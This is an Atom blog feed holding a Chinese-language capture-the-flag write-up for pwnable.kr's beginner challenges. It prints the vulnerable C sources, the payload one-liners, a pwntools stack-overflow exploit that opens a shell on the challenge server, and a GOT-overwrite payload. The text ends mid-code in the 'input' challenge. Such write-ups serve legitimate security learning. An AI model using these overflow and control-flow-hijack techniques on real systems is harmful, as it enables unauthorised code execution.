<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shadow Gallery</title>
  
  <subtitle>Live in the shadow</subtitle>
  <link href="https://srpopty.github.io/atom.xml" rel="self"/>
  
  <link href="https://srpopty.github.io/"/>
  <updated>2021-08-11T06:00:11.275Z</updated>
  <id>https://srpopty.github.io/</id>
  
  <author>
    <name>Srpopty</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Pwnable.KR Writeup of Toddler&#39;s Bottle</title>
    <link href="https://srpopty.github.io/2021/08/11/Pwnable.KR-Writeup-of-Toddler&#39;s-Bottle/"/>
    <id>https://srpopty.github.io/2021/08/11/Pwnable.KR-Writeup-of-Toddler&#39;s-Bottle/</id>
    <published>2021-08-11T05:59:25.000Z</published>
    <updated>2021-08-11T06:00:11.275Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Challenges in <a href="https://pwnable.kr/">Pwnable.kr</a></p></blockquote><h1 id="fd-1-pt"><a href="#fd-1-pt" class="headerlink" title="fd (1 pt)"></a>fd (1 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以控制的是argv[1]，最终的目标是<code>read(fd, buf, 32)</code>之后的buf中的字符串为<code>LETMEWIN\n</code>，所以我们可以将fd控制为从标准输入中读取，即fd为0，则需要满足<code>atoi( argv[1] ) == 0x1234</code>，那么直接执行如下命令即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print(&#x27;LETMEWIN&#x27;)&quot;</span>|./fd `python -c <span class="string">&quot;print(0x1234)&quot;</span>`</span><br></pre></td></tr></table></figure><p>首先<code>python -c &quot;print(&#39;LETMEWIN&#39;)&quot;</code>试fd程序可以从标准输入中读取<code>LETMEWIN\n</code>字符串，<code>python -c &quot;print(0x1234)&quot;</code>则可以将0x1234通过argv传递给fd。</p><h1 id="collision-3-pt"><a href="#collision-3-pt" class="headerlink" title="collision (3 pt)"></a>collision (3 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还是通过argv传递一个参数，但是需要通过<code>check_passcode</code>函数的检查，而且必须为20个字节，最后需要<code>check_passcode</code>返回值为<code>0x21dd09ec</code>。</p><p>首先<code>check_passcode</code>函数将输入的char*转为int*，由于这是一个32位的程序，这样在这个int*的数组中一共有5个int，32位程序中每一个int占4个字节，将这五个int加起来就是这个函数的返回值。假如我们输入的passcode中前4个字符为<code>aaaa</code>，那么在内存中就是<code>\x61\x61\x61\x61</code>，转换为int就变成了<code>0x61616161</code>，所以我们的目的就是让这5组字符串的和为<code>0x21dd09ec</code>。需要注意的一点是大小端排序的问题，例如输入的是<code>0x01020304</code>，那么在内存中就变成了<code>0x04030201</code>。</p><p>其实满足条件的字符串有很多，其中的一种为<code>0x01010101+0x01010101+0x01010101+0x11314141+0xda8c5a8 == 0x21dd09ec</code>，那么直接执行如下命令即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col `python -c <span class="string">&quot;print(&#x27;\x01\x01\x01\x01&#x27;*3+&#x27;\x41\x41\x31\x11&#x27;+&#x27;\xa8\xc5\xa8\x0d&#x27;)&quot;</span>`</span><br></pre></td></tr></table></figure><h1 id="bof-5-pt"><a href="#bof-5-pt" class="headerlink" title="bof (5 pt)"></a>bof (5 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个很简单的栈溢出，溢出的目标就是将栈上的局部变量key的值改为<code>0xcafebabe</code>，之后就白送一个shell。习惯性先用checksec检查一下，该开的都开了。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/1.png"></p><p>看一下key的位置在哪，算出来从eax到key的距离为52个字节，直接填充52个字节的垃圾数据然后修改key。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/2.png"></p><p>最终的exp如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9000</span></span><br><span class="line"></span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./bof&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line">conn.sendline(pg.get(<span class="number">52</span>) + p32(<span class="number">0xcafebabe</span>))</span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="flag-7-pt"><a href="#flag-7-pt" class="headerlink" title="flag (7 pt)"></a>flag (7 pt)</h1><p>这是一个逆向题，只给了一个二进制文件，先用file看一下，发现是64位程序，直接用ida64打开。函数非常非常多，先打开strings窗口看看有哪些字符串，首先看到的就是upx，这个程序很可能用upx加过壳，先用upx脱壳拿到真正的程序。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/3.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/4.png"></p><p>脱了壳以后就可以看到源程序了，直接IDA一把梭。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/5.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/6.png"></p><h1 id="passcode-10-pt"><a href="#passcode-10-pt" class="headerlink" title="passcode (10 pt)"></a>passcode (10 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个题还是一个栈溢出，不过是基于栈重叠的溢出。程序先后调用了welcome和login两个函数，在welcome函数中有一个100字节的buf，scanf中也没有任何溢出，而执行完welcome以后紧接着就执行login函数，在login函数中我们需要改变两个局部变量passcode1和passcode2的值才能拿到flag。</p><p>需要注意的是，当一个函数执行完毕后，并不会将该函数栈上的数据清空，仅改变esp和ebp的值，所以在执行完welcome以后，继续执行login的时候，我们在welcome中输入的buf中100个字节还保存在栈上，只不过这时候的栈帧已经变成了login的栈帧，也就是说：我们对welcome函数中buf的修改，是有可能影响到login函数中局部变量的值，我们来实验一下。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/7.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/8.png"></p><p>可以看到，在welcome中对buf从0xff940298一直到0xff9402fc，而在login中，passcode1的的地址为esp+4即0xff9402e4，小于0xff9402fc，接着scanf输入到passcode1的时候我们就可以向任意地址写一个数字（scanf的参数是%d），不过可惜的是buf影响不到passcode2，还是需要想办法绕过<code>passcode1==338150 &amp;&amp; passcode2==13371337</code>的判断。</p><p>既然可以修改任意地址到值为一个数字，那么我们就可以通过修改got表实现任意地址到跳转，在第一次scanf以后就有一个fflush函数，这是一个libc的函数，因此可以修改fflush的got表劫持控制流直接绕过if判断跳转到执行system的地址，即0x80485d7，但是scanf只接受一个数字，因此就需要将0x80485d7以int的形式输入即可。最后在bash中执行如下payload。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print(&#x27;a&#x27;*96+&#x27;\x04\xa0\x04\x08&#x27;+&#x27;134514135&#x27;)&quot;</span>|./passcode</span><br></pre></td></tr></table></figure><h1 id="random-1-pt"><a href="#random-1-pt" class="headerlink" title="random (1 pt)"></a>random (1 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">random = rand();<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很经典的random伪随机数，由于没有用srand设置随机数种子，默认会使用1作为种子，因此只需要在程序运行的时候用gdb看一下rand函数返回的第一个数字即可，为0x6b8b4567，和0xdeadbeef异或一下就得到最后的结果3039230856。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/9.png"></p><h1 id="input-4-pt"><a href="#input-4-pt" class="headerlink" title="input (4 pt)"></a>input (4 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// argv</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span 